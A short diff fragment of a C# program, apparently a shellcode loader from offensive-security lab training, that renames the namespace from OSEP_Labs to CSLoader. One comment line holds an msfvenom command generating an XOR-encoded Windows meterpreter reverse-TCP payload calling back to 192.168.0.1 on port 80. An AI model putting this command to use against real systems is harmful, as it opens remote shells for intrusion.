@@ -7,7 +7,7 @@ using System.Text;
 using System.Threading.Tasks;
 
 //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT 80 -f raw | python3 xor.py -e
-namespace OSEP_Labs
+namespace CSLoader
 {
     class Program
     {
